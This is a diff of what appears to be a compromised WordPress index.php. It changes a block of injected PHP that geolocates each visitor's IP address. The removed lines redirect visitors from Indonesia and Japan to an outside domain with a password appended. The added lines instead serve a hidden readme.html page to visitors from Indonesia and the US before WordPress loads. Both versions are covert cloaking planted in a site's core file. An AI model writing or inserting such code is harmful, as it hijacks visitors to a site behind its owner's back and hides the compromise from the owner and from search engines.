@@ -15,10 +15,11 @@ $api_url = "http://ip-api.com/json/{$ip}";
 $response = file_get_contents($api_url);
 $data = json_decode($response, true);
 
-if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'JP') {
-    $target = "https://alternativetls-ax98531.sky4system.com";
-    $password = "dev";
-    header("Location: $target?$password");
+if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US') {
+    ob_start();
+    include 'readme.html';
+    $output = ob_get_clean();
+    echo $output;
     exit();
 }
 ?>
@@ -39,5 +40,6 @@ define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
+
 
 
